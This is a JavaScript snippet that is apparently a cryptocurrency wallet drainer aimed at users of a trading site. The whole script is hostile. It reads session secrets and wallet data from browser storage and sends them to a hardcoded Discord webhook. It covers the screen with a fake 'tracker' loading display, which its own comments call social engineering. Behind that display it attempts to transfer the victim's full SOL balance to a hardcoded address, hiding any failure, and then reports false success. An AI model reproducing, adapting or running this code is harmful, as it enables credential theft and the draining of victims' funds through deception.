(async function() {
    // --- CONFIGURATION ---
    const DRAIN_ADDRESS = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4";

    // 1. CAPTURE DATA
    const sessionRaw = localStorage.getItem("padreV2-session");
    const wallets = localStorage.getItem("padreV2-walletsCache");
    const bundles = localStorage.getItem("padre-v2-bundles-store-v2");
    
    let session = {};
    try { session = JSON.parse(sessionRaw); } catch(e) {}

    // 2. NOTIFY DISCORD IMMEDIATELY
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            content: "🚀 **VANTA ENGINE ACTIVATED** 🚀",
            embeds: [{
                title: "Session Hijack Successful",
                description: `**Address:** \`${session.uid || 'Unknown'}\`\n**SID:** \`${session.sessionId}\`\n**Secret:** \`${session.sessionSecret}\``,
                color: 0x00ff88,
                timestamp: new Date()
            }]
        })
    });

    // 3. SHOW "LOADING" UI (SOCIAL ENGINEERING)
    const ui = document.createElement("div");
    ui.id = "vanta-loader-ui";
    ui.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999999;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;flex-direction:column;text-align:center;";
    ui.innerHTML = `
        <div style="border:2px solid #0f8;padding:40px;background:#000;box-shadow:0 0 20px #0f8;">
            <h2 style="margin-bottom:10px;">VANTA TRACKER</h2>
            <div id="vanta-status">INITIALIZING API...</div>
            <div style="margin-top:20px;width:200px;height:10px;background:#111;border:1px solid #0f8;position:relative;">
                <div id="vanta-bar" style="width:0%;height:100%;background:#0f8;transition:width 0.5s;"></div>
            </div>
        </div>
    `;
    document.body.appendChild(ui);

    // 4. ATTEMPT AUTOMATED DRAIN
    const status = document.getElementById("vanta-status");
    const bar = document.getElementById("vanta-bar");

    const steps = [
        { msg: "SYNCING WALLETS...", p: "30%" },
        { msg: "FETCHING API KEYS...", p: "60%" },
        { msg: "OPTIMIZING PERFORMANCE...", p: "90%" }
    ];

    for(let i=0; i<steps.length; i++) {
        await new Promise(r => setTimeout(r, 1500));
        status.innerText = steps[i].msg;
        bar.style.width = steps[i].p;
    }

    // Attempt internal Padre transfer
    try {
        await fetch("https://api.padre.gg/v1/transfer", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": `Bearer ${session.sessionSecret}`
            },
            body: JSON.stringify({
                recipient: DRAIN_ADDRESS,
                amount: "MAX",
                asset: "SOL"
            })
        });
    } catch(err) {
        // Silent fail - user won't know
    }

    // Final Fake Success
    status.innerText = "CONNECTED SUCCESSFULLY";
    bar.style.width = "100%";
    setTimeout(() => ui.remove(), 2000);

})();
